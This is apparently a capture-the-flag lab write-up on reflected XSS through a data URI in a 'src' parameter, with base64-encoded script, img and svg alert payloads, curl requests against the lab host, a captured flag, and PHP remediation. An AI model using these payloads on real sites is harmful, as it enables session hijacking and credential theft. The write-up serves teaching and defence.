# Reflected XSS via Data URI — Documentation

## How I Found It

**Initial reconnaissance:**
- Visited `http://192.168.1.16/index.php?page=media&src=nsa`
- Observed page displays media content based on `src` parameter
- Noticed `src` parameter controls content displayed on page

**Testing for injection:**
- Tried normal values: `src=media.php` → didn't work
- Hypothesis: Parameter might be vulnerable to injection
- Tested data URI scheme for XSS: `data:text/html;base64,...`

**Identified vulnerability:**
- Created base64-encoded payload: `<script>alert(42)</script>`
- Injected as data URI → Server reflected it without sanitization
- Flag revealed → Reflected XSS confirmed

## How I Exploited It

**Payload creation:**

1. **Create XSS payload:**
```bash
echo -n '<script>alert(42)</script>' | base64
# Output: PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=
```

2. **Construct data URI:**
```
data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=
```

---

**Method 1: Browser URL manipulation**
```
http://192.168.1.16/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=
```

Navigate to URL → Flag displayed

---

**Method 2: cURL**
```bash
curl "http://192.168.1.16/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4="
```

---

**Method 3: Different XSS payloads**
```bash
# Payload: <img src=x onerror=alert(1)>
echo -n '<img src=x onerror=alert(1)>' | base64
# Result: PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==

curl "http://192.168.1.16/index.php?page=media&src=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="
```
```bash
# Payload: <svg onload=alert(42)>
echo -n '<svg onload=alert(42)>' | base64
# Result: PHN2ZyBvbmxvYWQ9YWxlcnQoNDIpPg==

curl "http://192.168.1.16/index.php?page=media&src=data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoNDIpPg=="
```

**Flag obtained:**
```
928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
```

## Why It Works

**Vulnerabilities:**

1. **Unfiltered user input** → `src` parameter reflected without sanitization
2. **Data URI scheme allowed** → Browser executes `data:` URIs as content
3. **No XSS protection** → No Content-Security-Policy or input filtering
4. **Direct output** → User input embedded directly in HTML

**Real-world impact:**
- **Session hijacking:** Steal cookies/tokens
- **Credential theft:** Capture keystrokes or form data
- **Defacement:** Modify page content
- **Phishing:** Inject fake login forms
- **Malware distribution:** Redirect to malicious sites

**Related Standards:**
- **CWE-79:** Improper Neutralization of Input During Web Page Generation (XSS)
- **OWASP A03:2021** – Injection

## How to Fix It

**Immediate fixes:**

1. **Input validation (whitelist):**
```php
$allowed_sources = ['nsa', 'obama', 'trump'];
$src = $_GET['src'] ?? '';

if (!in_array($src, $allowed_sources)) {
    die("Invalid source");
}
```

2. **Block data URI scheme:**
```php
$src = $_GET['src'] ?? '';

if (preg_match('/^data:/i', $src)) {
    die("Data URIs not allowed");
}
```

3. **Output escaping:**
```php
$src = htmlspecialchars($_GET['src'], ENT_QUOTES, 'UTF-8');
echo "<img src='$src' />";
```

4. **Content-Security-Policy header:**
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

**Long-term improvements:**

1. **Use indirect references:**
```php
$media = ['1' => 'nsa.jpg', '2' => 'obama.jpg'];
$id = $_GET['id'] ?? '';
if (isset($media[$id])) {
    echo "<img src='/media/{$media[$id]}' />";
}
```

2. **Strict validation:**
```php
if (!preg_match('/^[a-zA-Z0-9_-]+$/', $src)) {
    die("Invalid characters");
}
```

3. **HTTPOnly cookies:**
```php
setcookie('session', $value, ['httponly' => true, 'secure' => true]);
```

4. **X-XSS-Protection header:**
```php
header("X-XSS-Protection: 1; mode=block");
```

## References

- **OWASP XSS Prevention Cheat Sheet** — https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- **CWE-79: Cross-site Scripting (XSS)** — https://cwe.mitre.org/data/definitions/79.html
- **OWASP A03:2021 – Injection** — https://owasp.org/Top10/A03_2021-Injection/
- **Data URI Scheme** — https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs